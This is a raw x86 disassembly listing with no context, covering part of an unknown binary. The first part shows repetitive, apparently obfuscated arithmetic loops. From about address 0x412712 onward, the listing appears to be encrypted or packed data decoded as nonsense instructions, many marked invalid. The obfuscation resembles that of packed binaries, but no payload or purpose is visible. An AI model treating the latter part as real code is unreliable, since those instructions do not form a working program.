  4124e9:	jne    0x412472
  4124ef:	jmp    0x41257c
  4124f4:	mov    edx,DWORD PTR [ebp-0x14]
  4124f7:	mov    DWORD PTR [ebp+0x8],edx
  4124fa:	jmp    0x41256f
  4124ff:	mov    edx,DWORD PTR [ebp+0x8]
  412502:	mov    ebx,DWORD PTR [ebp-0x8]
  412505:	xor    edx,eax
  412507:	xor    ebx,eax
  412509:	sub    edx,ebx
  41250b:	sub    edx,esi
  41250d:	xor    edx,eax
  41250f:	mov    DWORD PTR [ebp+0x8],edx
  412512:	mov    edx,DWORD PTR [ebp+0x8]
  412515:	mov    ebx,DWORD PTR [ebp-0x58]
  412518:	lea    edx,[ebx+edx*1+0x5708f8]
  41251f:	mov    DWORD PTR [ebp-0x58],edx
  412522:	mov    edx,DWORD PTR [ebp+0x8]
  412525:	mov    ebx,DWORD PTR [ebp-0x54]
  412528:	add    edx,0x64f89a
  41252e:	imul   edx,ebx
  412531:	mov    DWORD PTR [ebp-0x54],edx
  412534:	mov    edx,DWORD PTR [ebp+0x8]
  412537:	mov    ebx,DWORD PTR [ebp-0x50]
  41253a:	add    edx,0x242ebed
  412540:	and    edx,ebx
  412542:	mov    DWORD PTR [ebp-0x50],edx
  412545:	mov    edx,DWORD PTR [ebp+0x8]
  412548:	mov    ebx,DWORD PTR [ebp-0x4c]
  41254b:	add    edx,ecx
  41254d:	or     edx,ebx
  41254f:	mov    DWORD PTR [ebp-0x4c],edx
  412552:	mov    edx,DWORD PTR [ebp+0x8]
  412555:	mov    ebx,0xfdbe0321
  41255a:	sub    ebx,edx
  41255c:	add    ebx,DWORD PTR [ebp-0x48]
  41255f:	mov    DWORD PTR [ebp-0x48],ebx
  412562:	mov    edx,DWORD PTR [ebp+0x8]
  412565:	mov    ebx,DWORD PTR [ebp-0x44]
  412568:	add    edx,edi
  41256a:	xor    edx,ebx
  41256c:	mov    DWORD PTR [ebp-0x44],edx
  41256f:	mov    edx,DWORD PTR [ebp+0x8]
  412572:	xor    edx,eax
  412574:	add    edx,esi
  412576:	jne    0x4124ff
  41257c:	mov    edx,DWORD PTR [ebp-0x14]
  41257f:	mov    DWORD PTR [ebp+0x8],edx
  412582:	jmp    0x4125f7
  412587:	mov    edx,DWORD PTR [ebp+0x8]
  41258a:	mov    ebx,DWORD PTR [ebp-0x8]
  41258d:	xor    edx,eax
  41258f:	xor    ebx,eax
  412591:	sub    edx,ebx
  412593:	sub    edx,esi
  412595:	xor    edx,eax
  412597:	mov    DWORD PTR [ebp+0x8],edx
  41259a:	mov    edx,DWORD PTR [ebp+0x8]
  41259d:	mov    ebx,DWORD PTR [ebp-0x58]
  4125a0:	lea    edx,[ebx+edx*1+0x5708f8]
  4125a7:	mov    DWORD PTR [ebp-0x58],edx
  4125aa:	mov    edx,DWORD PTR [ebp+0x8]
  4125ad:	mov    ebx,DWORD PTR [ebp-0x54]
  4125b0:	add    edx,0x64f89a
  4125b6:	imul   edx,ebx
  4125b9:	mov    DWORD PTR [ebp-0x54],edx
  4125bc:	mov    edx,DWORD PTR [ebp+0x8]
  4125bf:	mov    ebx,DWORD PTR [ebp-0x50]
  4125c2:	add    edx,0x242ebed
  4125c8:	and    edx,ebx
  4125ca:	mov    DWORD PTR [ebp-0x50],edx
  4125cd:	mov    edx,DWORD PTR [ebp+0x8]
  4125d0:	mov    ebx,DWORD PTR [ebp-0x4c]
  4125d3:	add    edx,ecx
  4125d5:	or     edx,ebx
  4125d7:	mov    DWORD PTR [ebp-0x4c],edx
  4125da:	mov    edx,DWORD PTR [ebp+0x8]
  4125dd:	mov    ebx,0xfdbe0321
  4125e2:	sub    ebx,edx
  4125e4:	add    ebx,DWORD PTR [ebp-0x48]
  4125e7:	mov    DWORD PTR [ebp-0x48],ebx
  4125ea:	mov    edx,DWORD PTR [ebp+0x8]
  4125ed:	mov    ebx,DWORD PTR [ebp-0x44]
  4125f0:	add    edx,edi
  4125f2:	xor    edx,ebx
  4125f4:	mov    DWORD PTR [ebp-0x44],edx
  4125f7:	mov    edx,DWORD PTR [ebp+0x8]
  4125fa:	xor    edx,eax
  4125fc:	add    edx,esi
  4125fe:	jne    0x412587
  412604:	mov    edx,DWORD PTR [ebp-0x8]
  412607:	mov    ebx,DWORD PTR [ebp-0xc]
  41260a:	xor    edx,eax
  41260c:	lea    edx,[edx+ebx*1+0x3272f8]
  412613:	mov    DWORD PTR [ebp-0xc],edx
  412616:	mov    edx,DWORD PTR [ebp-0x10]
  412619:	xor    edx,eax
  41261b:	add    edx,esi
  41261d:	jne    0x4122e0
  412623:	jmp    0x414ab3
  412628:	mov    ecx,DWORD PTR [ebp-0x14]
  41262b:	mov    DWORD PTR [ebp+0x8],ecx
  41262e:	jmp    0x4126a7
  412633:	mov    ecx,DWORD PTR [ebp+0x8]
  412636:	mov    edx,DWORD PTR [ebp-0x8]
  412639:	xor    ecx,eax
  41263b:	xor    edx,eax
  41263d:	sub    ecx,edx
  41263f:	sub    ecx,esi
  412641:	xor    ecx,eax
  412643:	mov    DWORD PTR [ebp+0x8],ecx
  412646:	mov    ecx,DWORD PTR [ebp+0x8]
  412649:	mov    edx,DWORD PTR [ebp-0x58]
  41264c:	lea    ecx,[edx+ecx*1+0x5708f8]
  412653:	mov    DWORD PTR [ebp-0x58],ecx
  412656:	mov    ecx,DWORD PTR [ebp+0x8]
  412659:	mov    edx,DWORD PTR [ebp-0x54]
  41265c:	add    ecx,0x64f89a
  412662:	imul   ecx,edx
  412665:	mov    DWORD PTR [ebp-0x54],ecx
  412668:	mov    ecx,DWORD PTR [ebp+0x8]
  41266b:	mov    edx,DWORD PTR [ebp-0x50]
  41266e:	add    ecx,0x242ebed
  412674:	and    ecx,edx
  412676:	mov    DWORD PTR [ebp-0x50],ecx
  412679:	mov    ecx,DWORD PTR [ebp+0x8]
  41267c:	mov    edx,DWORD PTR [ebp-0x4c]
  41267f:	add    ecx,0xf641bea
  412685:	or     ecx,edx
  412687:	mov    DWORD PTR [ebp-0x4c],ecx
  41268a:	mov    ecx,DWORD PTR [ebp+0x8]
  41268d:	mov    edx,0xfdbe0321
  412692:	sub    edx,ecx
  412694:	add    edx,DWORD PTR [ebp-0x48]
  412697:	mov    DWORD PTR [ebp-0x48],edx
  41269a:	mov    ecx,DWORD PTR [ebp+0x8]
  41269d:	mov    edx,DWORD PTR [ebp-0x44]
  4126a0:	add    ecx,edi
  4126a2:	xor    ecx,edx
  4126a4:	mov    DWORD PTR [ebp-0x44],ecx
  4126a7:	mov    ecx,DWORD PTR [ebp+0x8]
  4126aa:	xor    ecx,eax
  4126ac:	add    ecx,esi
  4126ae:	jne    0x412633
  4126b4:	jmp    0x414abf
  4126b9:	mov    ecx,DWORD PTR [ebp+0x8]
  4126bc:	mov    edx,DWORD PTR [ebp-0x8]
  4126bf:	xor    ecx,eax
  4126c1:	xor    edx,eax
  4126c3:	sub    ecx,edx
  4126c5:	sub    ecx,esi
  4126c7:	xor    ecx,eax
  4126c9:	mov    DWORD PTR [ebp+0x8],ecx
  4126cc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126cf:	mov    edx,DWORD PTR [ebp-0x58]
  4126d2:	lea    ecx,[edx+ecx*1+0x5708f8]
  4126d9:	mov    DWORD PTR [ebp-0x58],ecx
  4126dc:	mov    ecx,DWORD PTR [ebp+0x8]
  4126df:	mov    edx,DWORD PTR [ebp-0x54]
  4126e2:	add    ecx,0x64f89a
  4126e8:	imul   ecx,edx
  4126eb:	mov    DWORD PTR [ebp-0x54],ecx
  4126ee:	mov    ecx,DWORD PTR [ebp+0x8]
  4126f1:	mov    edx,DWORD PTR [ebp-0x50]
  4126f4:	add    ecx,0x242ebed
  4126fa:	and    ecx,edx
  4126fc:	mov    DWORD PTR [ebp-0x50],ecx
  4126ff:	mov    ecx,DWORD PTR [ebp+0x8]
  412702:	mov    edx,DWORD PTR [ebp-0x4c]
  412705:	add    ecx,0xf641bea
  41270b:	or     ecx,edx
  41270d:	jmp    0x414a86
  412712:	enter  0xa3a8,0x29
  412716:	jecxz  0x412742
  412718:	dec    edx
  412719:	push   0xffffff84
  41271b:	add    al,0xed
  41271d:	xlat   BYTE PTR ds:[ebx]
  41271e:	shr    DWORD PTR [eax+0x720e3257],cl
  412724:	jnp    0x4127a1
  412726:	xlat   BYTE PTR ds:[ebx]
  412727:	sahf   
  412728:	jnp    0x4127a5
  41272a:	add    DWORD PTR [ecx+0x2d2c99a4],ebx
  412730:	mov    esp,0x7333c083
  412735:	ret    0x42d3
  412738:	mov    dh,0x41
  41273a:	int    0x0
  41273c:	data16 sub ah,BYTE PTR [ecx-0x46]
  412740:	push   ebp
  412741:	jns    0x4126fd
  412743:	or     al,BYTE PTR [eax-0x58]
  412746:	push   edx
  412747:	iret   
  412748:	pop    edi
  412749:	(bad)  
  41274a:	jo     0x412761
  41274c:	mov    dh,0x5
  41274e:	jl     0x412722
  412750:	aad    0x26
  412752:	inc    eax
  412753:	push   ss
  412754:	jno    0x412743
  412756:	push   ds
  412757:	mov    ah,0xbe
  412759:	div    BYTE PTR [esi]
  41275b:	push   ss
  41275c:	std    
  41275d:	xor    BYTE PTR [edx-0x40],bh
  412760:	ror    DWORD PTR [ebx],cl
  412762:	popa   
  412763:	rcl    al,1
  412765:	adc    DWORD PTR [ebp-0x74],esp
  412768:	inc    edi
  412769:	mov    dl,0xa9
  41276b:	fild   WORD PTR [ecx+eiz*8]
  41276e:	push   ebx
  41276f:	mov    ch,0x1e
  412771:	cld    
  412772:	fisubr DWORD PTR [ecx-0x36]
  412775:	imul   ebx,ebx,0xffffffef
  412778:	iret   
  412779:	retf   
  41277a:	stos   BYTE PTR es:[edi],al
  41277b:	inc    edx
  41277c:	jne    0x41270f
  41277e:	ds xchg esp,eax
  412780:	mov    ebp,0xa943c977
  412785:	pop    ss
  412786:	sub    eax,0x7c524874
  41278b:	pop    edi
  41278c:	xlat   BYTE PTR ds:[ebx]
  41278d:	ror    BYTE PTR [edx-0x59884d52],0xf
  412794:	in     al,0xc
  412796:	enter  0x108a,0x37
  41279a:	sbb    eax,DWORD PTR [eax+eax*1]
  41279d:	xchg   ebx,eax
  41279e:	loopne 0x412769
  4127a0:	mov    ch,0xea
  4127a2:	lds    esp,FWORD PTR [eax]
  4127a4:	shl    al,0x8d
  4127a7:	cmc    
  4127a8:	mov    ecx,edx
  4127aa:	ror    ecx,1
  4127ac:	into   
  4127ad:	lock mov dh,0xf4
  4127b0:	jp     0x412821
  4127b2:	pop    esp
  4127b3:	adc    DWORD PTR [esi+ecx*4],0xffffff97
  4127b7:	mov    al,ds:0xeadc51ae
  4127bc:	repz ret 
  4127be:	sub    eax,0x3075226e
  4127c3:	outs   dx,BYTE PTR ds:[esi]
  4127c4:	lahf   
  4127c5:	pop    ss
  4127c6:	mov    ebp,0xa574fe8a
  4127cb:	fld    DWORD PTR [ecx+0x5b]
  4127ce:	push   0xa
  4127d0:	push   ds
  4127d1:	test   eax,0x368ea885
  4127d6:	imul   eax,DWORD PTR [edi],0x36
  4127d9:	leave  
  4127da:	jg     0x412848
  4127dc:	clc    
  4127dd:	ss je  0x4127d1
  4127e0:	data16 jge 0x41282c
  4127e3:	xchg   esp,eax
  4127e5:	call   0x715523c3
  4127ea:	xchg   esi,eax
  4127eb:	pop    es
  4127ec:	scas   eax,DWORD PTR es:[edi]
  4127ed:	xchg   DWORD PTR [eax-0x15aac747],eax
  4127f3:	inc    esi
  4127f4:	(bad)  
  4127f5:	ficomp WORD PTR [ecx-0x1a]
  4127f8:	push   0xffffffa5
  4127fa:	fcom   DWORD PTR [ecx-0x58]
  4127fd:	dec    esp
  4127fe:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4127ff:	pop    ds
  412800:	es mov edx,0x462beb2f
  412806:	pop    ecx
  412807:	xchg   ebx,eax
  412808:	mov    cl,0xa0
  41280a:	xor    al,ah
  41280c:	pop    ds
  41280d:	cdq    
  41280e:	adc    DWORD PTR [eax+edi*2],edi
  412811:	or     eax,0x2b6ba268
  412816:	add    BYTE PTR [esi+0x658952f4],dh
  41281c:	xchg   edi,eax
  41281d:	jg     0x412836
  41281f:	jle    0x412800
  412821:	ins    DWORD PTR es:[edi],dx
  412822:	adc    ch,BYTE PTR [ecx-0x57]
  412825:	sbb    BYTE PTR [ebx],dl
  412827:	jae    0x412857
  412829:	ja     0x4127e7
  41282b:	in     al,0xbf
  41282d:	cdq    
  41282e:	cld    
  41282f:	gs jb  0x4128a7
  412832:	mov    WORD PTR [esi],es
  412834:	sbb    BYTE PTR [ebp+0x7f],dl
  412837:	xor    DWORD PTR [edx+0x5c1a671c],ebx
  41283d:	cmp    eax,0xc8227248
  412842:	cs jge 0x4127ce
  412845:	mov    ds:0xfb9e1089,al
  41284a:	aad    0x27
  41284c:	js     0x4127ff
  41284e:	fisubr DWORD PTR [edx]
  412850:	jmp    0x41287c
  412852:	jno    0x412861
  412854:	mov    ds:0xb8720047,eax
  412859:	sar    BYTE PTR [eax+ebp*8+0xc],1
  41285d:	ret    0x4ded
  412860:	push   ds
  412861:	or     ah,BYTE PTR ds:0xb834746f
  412867:	push   0xb1f5cff9
  41286c:	lahf   
  41286d:	ss ret 
  41286f:	lds    ebp,FWORD PTR [ebp+eax*1+0x41]
  412873:	aaa    
  412874:	jge    0x41283c
  412876:	inc    edx
  412877:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412878:	stc    
  412879:	stc    
  41287a:	das    
  41287b:	inc    eax
  41287c:	in     al,dx
  41287d:	cmp    eax,0x5811d7d3
  412882:	jmp    0x7141:0x96fd0b3c
  412889:	push   ecx
  41288a:	push   ebp
  41288b:	test   al,0xba
  41288d:	arpl   dx,bp
  41288f:	pusha  
  412890:	out    0x8b,eax
  412892:	mov    ecx,0x89000eaf
  412897:	cs ds rcl dl,cl
  41289b:	jmp    FWORD PTR [eax]
  41289d:	dec    eax
  41289e:	mov    edi,0x1f71a4eb
  4128a3:	popf   
  4128a4:	(bad)  
  4128a5:	mov    bh,0x33
  4128a7:	leave  
  4128a8:	and    BYTE PTR [eax-0x78],0x2d
  4128ac:	sub    DWORD PTR [ebx-0x40],edi
  4128af:	xchg   ebx,eax
  4128b0:	inc    ecx
  4128b1:	xchg   DWORD PTR [edx+ecx*1-0x38],esi
  4128b5:	mov    bh,0x3c
  4128b7:	mov    dl,BYTE PTR [esi]
  4128b9:	dec    eax
  4128ba:	test   al,0xcb
  4128bc:	loop   0x4128b8
  4128be:	sub    eax,ebx
  4128c0:	pusha  
  4128c1:	hlt    
  4128c2:	cdq    
  4128c3:	call   0xff216dc3
  4128c8:	mov    bh,0x2e
  4128ca:	call   0x89f:0x98ba81d7
  4128d1:	adc    BYTE PTR [eax+0x41],dl
  4128d4:	xchg   esi,eax
  4128d5:	push   ss
  4128d6:	pop    ss
  4128d7:	or     ebx,edi
  4128d9:	add    DWORD PTR [ebp-0x50],0x3c
  4128dd:	(bad)  
  4128de:	and    DWORD PTR [ecx+ebx*2+0x2e],0x7080b961
  4128e6:	imul   esi,DWORD PTR [ecx],0xf8f7de21
  4128ec:	sti    
  4128ed:	pusha  
  4128ee:	pop    ss
  4128ef:	add    bl,ah
  4128f1:	or     al,0x67
  4128f3:	inc    esp
  4128f4:	inc    ebx
  4128f5:	and    DWORD PTR [ebp+0x75e75675],esi
  4128fb:	jb     0x41294a
  4128fd:	push   ebp
  4128fe:	rcl    DWORD PTR [edi-0x1c],cl
  412901:	sahf   
  412902:	fmul   QWORD PTR [ebx]
  412904:	mov    dl,0xde
  412906:	lods   al,BYTE PTR ds:[esi]
  412907:	iret   
  412908:	cld    
  412909:	fstp   QWORD PTR [esi+0x12]
  41290c:	xchg   esi,eax
  41290d:	pop    ss
  41290e:	cwde   
  41290f:	lods   eax,DWORD PTR ds:[esi]
  412910:	cld    
  412911:	iret   
  412912:	add    al,0xee
  412914:	xchg   BYTE PTR [eax-0x35463c31],dh
  41291a:	aam    0x2f
  41291c:	daa    
  41291d:	lea    ecx,[esp+eax*4-0x634a962f]
  412924:	sbb    dh,ch
  412926:	pop    ecx
  412927:	jle    0x4129a5
  412929:	outs   dx,DWORD PTR ds:[esi]
  41292a:	aam    0x2c
  41292c:	imul   esp,eax,0x1
  41292f:	daa    
  412930:	mov    dh,0xe6
  412932:	out    dx,al
  412933:	fisttp DWORD PTR [edi+0x70]
  412936:	lea    ebp,[ecx-0xfbd29b4]
  41293c:	cld    
  41293d:	iret   
  41293e:	sahf   
  41293f:	pop    esp
  412940:	cmc    
  412941:	into   
  412942:	sub    ebx,DWORD PTR [ecx+0xa]
  412945:	and    edi,eax
  412947:	jb     0x4128e0
  412949:	cdq    
  41294a:	inc    ecx
  41294b:	mov    BYTE PTR [ecx+ebp*2-0x2e],dl
  41294f:	mov    DWORD PTR [esi-0x6793299e],0x2348683d
  412959:	mov    al,0x14
  41295b:	(bad)  
  41295c:	push   eax
  41295d:	sbb    ch,ch
  41295f:	push   ecx
  412960:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412961:	push   edi
  412962:	pusha  
  412963:	mov    ecx,0xcd8a9a9f
  412968:	data16 add BYTE PTR [ebp+0x18bcb3b9],0x6b
  412970:	lds    ebx,FWORD PTR [ebx]
  412972:	sub    esp,DWORD PTR [ecx]
  412974:	mov    ebp,0xd65321be
  412979:	popf   
  41297a:	dec    ebx
  41297b:	popf   
  41297c:	dec    ebp
  41297d:	(bad)  
  41297e:	xor    dl,cl
  412980:	sub    al,0x69
  412982:	mov    al,ds:0xa97a572
  412987:	(bad)  
  412989:	je     0x4129e2
  41298b:	jmp    0xe5d7:0xbf8da9d9
  412992:	js     0x4129f7
  412994:	loope  0x412952
  412996:	addr16 push ecx
  412998:	into   
  412999:	fld    TBYTE PTR [eiz*1+0x445ea6a0]
  4129a0:	repz push esi
  4129a2:	lds    edx,FWORD PTR [ebx+0x2e]
  4129a5:	arpl   bp,dx
  4129a7:	fmul   st,st(3)
  4129a9:	sahf   
  4129aa:	xchg   esi,eax
  4129ab:	test   DWORD PTR [edx-0x2e],edi
  4129ae:	stos   BYTE PTR es:[edi],al
  4129af:	lods   al,BYTE PTR ds:[esi]
  4129b0:	and    DWORD PTR [eax+0x6168185f],edi
  4129b6:	fnsave [edx]
  4129b8:	xchg   edi,eax
  4129b9:	pop    esi
  4129ba:	or     eax,0x1fb5df25
  4129bf:	xor    DWORD PTR [eax],eax
  4129c1:	lahf   
  4129c2:	sbb    esi,DWORD PTR [eax]
  4129c4:	pop    ebp
  4129c5:	repz mov dh,BYTE PTR [ecx-0x3477222a]
  4129cc:	jae    0x412a24
  4129ce:	ret    0x933f
  4129d1:	inc    ebx
  4129d2:	ror    BYTE PTR [edx-0x37b346fc],0x6a
  4129d9:	outs   dx,DWORD PTR ds:[esi]
  4129da:	fs je  0x412a18
  4129dd:	es jge 0x4129f9
  4129e0:	xor    eax,0xbb4d4183
  4129e5:	loop   0x4129ba
  4129e7:	xor    bh,ch
  4129e9:	int3   
  4129ea:	repz jnp 0x4129fa
  4129ed:	daa    
  4129ee:	cmp    esp,DWORD PTR [edx]
  4129f0:	push   cs
  4129f1:	cdq    
  4129f2:	repnz cld 
  4129f4:	inc    edx
  4129f5:	aas    
  4129f6:	sub    cl,BYTE PTR [eax+0x5d8f63ec]
  4129fc:	pop    ecx
  4129fd:	jmp    0x4129a6
  4129ff:	out    0xaf,al
  412a01:	mov    ds:0x5df4d13d,eax
  412a06:	sbb    al,0xcd
  412a08:	cmp    ch,dl
  412a0a:	ja     0x412a74
  412a0c:	xchg   edi,eax
  412a0d:	gs scas al,BYTE PTR es:[edi]
  412a0f:	rol    ch,cl
  412a11:	nop
  412a12:	clc    
  412a13:	test   al,ch
  412a15:	in     al,0x75
  412a17:	nop
  412a18:	dec    esp
  412a19:	add    BYTE PTR [edx+0x4b],0xb2
  412a1d:	xor    edi,DWORD PTR [edi]
  412a1f:	dec    ebx
  412a20:	(bad)  
  412a21:	jmp    0x7c94c74e
  412a26:	inc    edx
  412a27:	vmptrld QWORD PTR [ebx+0x66]
  412a2b:	test   eax,0xa6ca779
  412a30:	hlt    
  412a31:	inc    esi
  412a32:	sbb    ebp,DWORD PTR [ebx]
  412a34:	xchg   esi,eax
  412a35:	inc    ebp
  412a36:	dec    edi
  412a37:	jmp    0xd196:0xc95f4068
  412a3e:	push   cs
  412a3f:	outs   dx,DWORD PTR ds:[esi]
  412a40:	clc    
  412a41:	push   ds
  412a42:	push   edx
  412a43:	(bad)  [ebx-0xf]
  412a46:	iret   
  412a47:	mov    esp,0x4dfacd39
  412a4c:	test   bl,al
  412a4e:	nop
  412a4f:	xchg   BYTE PTR [eax+0x4721e845],cl
  412a55:	sub    cl,ah
  412a57:	out    0xaa,al
  412a59:	push   ebp
  412a5a:	repnz mov ds,WORD PTR [ebp+0x5a]
  412a5e:	stc    
  412a5f:	push   edx
  412a60:	and    al,0xb4
  412a62:	xor    eax,0xf806c5a3
  412a67:	dec    eax
  412a68:	add    esp,DWORD PTR [edx]
  412a6a:	pop    edi
  412a6b:	rcl    eax,cl
  412a6d:	cmp    BYTE PTR [ebp+0x54703e75],0x4
  412a74:	add    eax,0x9878b8a7
  412a79:	ss xchg esi,eax
  412a7b:	or     bl,BYTE PTR [eax+ebx*8-0x4c]
  412a7f:	mov    ecx,DWORD PTR [edi]
  412a81:	sar    DWORD PTR [eax],1
  412a83:	dec    ebx
  412a84:	lea    ebp,[ecx+0x2def98a9]
  412a8a:	push   esp
  412a8b:	mov    esp,DWORD PTR [ebx+eax*8]
  412a8e:	jbe    0x412ae2
  412a90:	into   
  412a91:	sbb    eax,0xb46df8de
  412a96:	add    BYTE PTR [esi],bh
  412a98:	xchg   edx,eax
  412a99:	adc    edx,DWORD PTR [esi+0x61105b0f]
  412a9f:	push   edi
  412aa0:	or     edi,DWORD PTR [ebx+0x488573f]
  412aa6:	mov    eax,0xf59b69e6
  412aab:	test   DWORD PTR [edi],esi
  412aad:	jp     0x412b08
  412aaf:	jg     0x412aca
  412ab1:	or     DWORD PTR [ebx-0x21c3da3c],ebp
  412ab7:	xor    DWORD PTR gs:[esi+0x3f],edx
  412abb:	jecxz  0x412ab7
  412abd:	jp     0x412b0c
  412abf:	or     cl,BYTE PTR [ecx-0x6b19bcc5]
  412ac5:	or     edi,DWORD PTR [ebx]
  412ac7:	test   DWORD PTR [ecx+0x4d],edx
  412aca:	nop
  412acb:	out    dx,al
  412acc:	jb     0x412acb
  412ace:	pusha  
  412acf:	pop    esi
  412ad0:	leave  
  412ad1:	in     ax,0x20
  412ad4:	add    eax,0x84926d94
  412ad9:	xlat   BYTE PTR ds:[ebx]
  412ada:	hlt    
  412adb:	imul   esi,DWORD PTR [ecx],0xe7d0194e
  412ae1:	mov    esi,0x96398d13
  412ae6:	stc    
  412ae7:	leave  
  412ae8:	add    eax,edi
  412aea:	inc    edx
  412aeb:	fadd   DWORD PTR [edi]
  412aed:	fwait
  412aee:	xor    al,0x19
  412af0:	pop    ebp
  412af1:	das    
  412af2:	mov    BYTE PTR [edi],al
  412af4:	loop   0x412b1a
  412af6:	pop    edi
  412af7:	inc    ecx
  412af8:	pop    ebp
  412af9:	mov    WORD PTR [eax+0x2a84de5a],ss
  412aff:	push   0x7ad6ebde
  412b04:	das    
  412b05:	xor    dl,BYTE PTR [esi+0xf]
  412b08:	addr16 ds mov edi,0x83381ee9
  412b0f:	xor    eax,0xff1b34d6
  412b14:	and    dl,dl
  412b16:	lods   al,BYTE PTR ds:[esi]
  412b18:	ret    0x1603
  412b1b:	pop    esi
  412b1c:	pop    es
  412b1d:	int    0x20
  412b1f:	sbb    BYTE PTR [ebx+0x1b55ac84],bl
  412b25:	and    eax,0xfde9ec17
  412b2a:	and    ah,BYTE PTR [edi+esi*2+0xc]
  412b2e:	ret    
  412b2f:	dec    edx
  412b30:	outs   dx,DWORD PTR ds:[esi]
  412b31:	out    0xaa,eax
  412b33:	xor    dl,al
  412b35:	aaa    
  412b36:	(bad)  
  412b37:	leave  
  412b38:	inc    edx
  412b39:	push   edi
  412b3a:	ffreep st(3)
  412b3c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412b3d:	sub    edx,DWORD PTR [ebx]
  412b3f:	inc    esp
  412b40:	mov    cl,0xef
  412b42:	xchg   ecx,eax
  412b43:	xor    ebx,DWORD PTR [ebp+0x49]
  412b46:	pushf  
  412b47:	push   esp
  412b48:	xor    eax,0xf3fdb0ef
  412b4d:	call   0xc9661031
  412b52:	mov    bl,0xda
  412b54:	les    esi,FWORD PTR [edx-0x7a]
  412b57:	jp     0x412b4d
  412b59:	push   eax
  412b5a:	sbb    BYTE PTR [ebx+0x45],bl
  412b5d:	cmp    DWORD PTR [ebp+0x53],edi
  412b60:	jo     0x412aed
  412b62:	cld    
  412b63:	test   eax,0x64866ba7
  412b68:	xor    dh,dl
  412b6a:	cmp    eax,DWORD PTR [esp+esi*8]
  412b6d:	or     esi,ebp
  412b6f:	sub    al,0x62
  412b71:	xchg   DWORD PTR [ebp-0x61],esi
  412b74:	fwait
  412b75:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412b76:	adc    DWORD PTR ds:[ebx-0xd726a7e],0x3b
  412b7e:	nop
  412b7f:	or     al,0x51
  412b81:	sub    al,0x6d
  412b83:	pop    ds
  412b84:	(bad)  
  412b88:	pop    ebp
  412b89:	cmp    eax,0xc00b88
  412b8e:	add    al,0xb7
  412b90:	push   esi
  412b91:	pop    ds
  412b92:	jmp    0x7cc6:0x59109889
  412b99:	imul   edi,DWORD PTR [edi+0x4b],0xf59c0bb9
  412ba0:	std    
  412ba1:	or     ebx,edx
  412ba3:	xlat   BYTE PTR ds:[ebx]
  412ba4:	pusha  
  412ba5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412ba6:	push   0x523396bd
  412bab:	mov    dh,0x8
  412bad:	cmp    BYTE PTR [esi-0x3b1a1d3],0x4c
  412bb4:	ror    DWORD PTR [ebx+ecx*1],1
  412bb7:	dec    ebp
  412bb8:	mov    ch,dl
  412bba:	test   BYTE PTR [eax],bh
  412bbc:	clc    
  412bbd:	mov    DWORD PTR ds:0x7d419a85,0xfb146dd
  412bc7:	mov    ds:0x406b5b66,al
  412bcc:	in     eax,dx
  412bcd:	bound  edx,QWORD PTR [esi+0x6f45a298]
  412bd3:	xchg   edi,eax
  412bd4:	xor    al,0xc7
  412bd6:	sub    BYTE PTR [esi+0x436000b],bl
  412bdc:	xchg   esi,eax
  412bdd:	inc    edx
  412bde:	mov    al,0x1b
  412be0:	pop    ds
  412be1:	pop    ebp
  412be2:	dec    ebx
  412be3:	(bad)  
  412be4:	fdiv   st,st(4)
  412be6:	or     BYTE PTR [edx-0x67],ch
  412be9:	xchg   ebx,eax
  412bea:	xchg   edx,eax
  412beb:	leave  
  412bec:	dec    eax
  412bed:	outs   dx,BYTE PTR ds:[esi]
  412bee:	jmp    0xf85c:0x8016c96c
  412bf5:	ror    BYTE PTR [ebx-0x1fc76399],cl
  412bfb:	call   0xd36dd1d5
  412c00:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c01:	push   0x68
  412c03:	jnp    0x412c73
  412c05:	(bad)  
  412c06:	shl    BYTE PTR [edx*1+0x483dd1f1],0xa9
  412c0e:	inc    eax
  412c0f:	test   DWORD PTR [edi-0xc],ebx
  412c12:	adc    al,0xd
  412c14:	mov    BYTE PTR [eax],bl
  412c16:	mov    bl,0xf
  412c18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c19:	in     al,dx
  412c1a:	add    edx,DWORD PTR [edx-0x15]
  412c1d:	push   ecx
  412c1e:	dec    edx
  412c1f:	imul   ebp,DWORD PTR [ebx+0x327bbc61],0xffffffc7
  412c26:	es inc eax
  412c28:	aam    0xa
  412c2a:	outs   dx,DWORD PTR ds:[esi]
  412c2b:	xlat   BYTE PTR ds:[ebx]
  412c2c:	sub    eax,0xf1d6ae6
  412c31:	push   0x50
  412c33:	pop    ecx
  412c34:	sti    
  412c35:	pushw  0xcc61
  412c39:	mov    BYTE PTR [di],ch
  412c3c:	iret   
  412c3d:	add    al,0xc6
  412c3f:	mov    ds:0xcd7a75f2,al
  412c44:	jmp    0xb036c06a
  412c49:	test   eax,0x67c8a4f8
  412c4e:	pushf  
  412c4f:	dec    edi
  412c50:	jmp    0x6f06:0x4b17d3be
  412c57:	call   FWORD PTR [ebp-0x52c6d925]
  412c5d:	inc    ebp
  412c5e:	push   ebx
  412c5f:	cmp    al,0x0
  412c61:	(bad)  
  412c62:	retf   
  412c63:	sti    
  412c64:	iret   
  412c65:	and    al,0xdf
  412c67:	iret   
  412c68:	inc    edi
  412c69:	jle    0x412bfb
  412c6b:	and    DWORD PTR [ebx-0x40],esp
  412c6e:	jbe    0x412c74
  412c70:	aas    
  412c71:	sub    DWORD PTR [edi-0xc4ad4d7],0x3b
  412c78:	dec    ebp
  412c79:	lds    ebp,FWORD PTR [ebx-0x27]
  412c7c:	lea    esi,[eax]
  412c7e:	mov    bh,0x60
  412c80:	sub    eax,0xe7aa8454
  412c85:	mov    bh,0x3e
  412c87:	adc    ah,BYTE PTR [ebx+0x9]
  412c8a:	pop    esi
  412c8b:	(bad)  
  412c8d:	inc    esp
  412c8e:	xchg   BYTE PTR [edi+0x655b2e2e],dh
  412c94:	(bad)  
  412c95:	(bad)  
  412c96:	lods   al,BYTE PTR ds:[esi]
  412c97:	inc    edi
  412c98:	imul   ebp,DWORD PTR [ecx-0x37112a6b],0xffffffed
  412c9f:	sub    DWORD PTR [esi],edx
  412ca1:	loop   0x412cf5
  412ca3:	ja     0x412c72
  412ca5:	int    0xb4
  412ca7:	test   DWORD PTR [esi],ecx
